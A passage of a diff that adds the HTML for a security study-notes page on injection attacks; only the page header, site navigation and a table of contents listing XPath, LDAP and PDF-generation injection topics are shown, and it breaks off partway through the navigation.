@@ -1,0 +1,3064 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../attacking-authentication-mechanisms/">
+      
+      
+        <link rel="next" href="../introduction-to-nosql-injection/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Injection Attacks - Dan's Cyber Stuff</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#injection-attacks" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Dan's Cyber Stuff
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Injection Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Dan's Cyber Stuff
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Study Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Study Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bug Bounty Hunting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Bug Bounty Hunting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../owasp-top-10-2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OWASP Top 10 2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reporting-and-poc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting & POC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tech-interview-prep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tech Interview Prep
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BSCP Study Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    BSCP Study Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/command-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross-Site Scripting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/path-traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bscp-study-notes/sql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CWEE Study Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CWEE Study Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attacking-authentication-mechanisms/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking Authentication Mechanisms
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#xpath-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XPath Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XPath Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#queriy-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Queriy Basics
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Queriy Basics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#base-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base Case
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base-case-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base Case Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#predicates" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Predicates
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#predicate-operands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Predicate Operands
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wildcards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wildcards
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wildcard-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wildcard Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unions
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Data Exfiltration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Data Exfiltration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#time-based-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time-based Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Commands
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="LDAP Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP - Authentication Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-data-exfiltration-blind-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP - Data Exfiltration &amp; Blind Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pdf-generation-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PDF Generation Vulnerabilities
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PDF Generation Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local File Inclusion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#annotations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Annotations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../introduction-to-nosql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction to NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../intro-to-whitebox-pentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Intro to Whitebox Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CWES Study Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CWES Study Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/api-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/attacking-common-applications/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking Common Applications
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/attacking-graphql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking Web Applications with Ffuf
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/broken-authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Broken Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/command-injections/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injections
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross-Site Scripting (XSS)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/file-inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/file-upload-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/hacking-wordpress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hacking WordPress
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JavaScript Deobfuscation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/login-brute-forcing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Login Brute Forcing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/server-side-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-Side Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/session-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Session Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
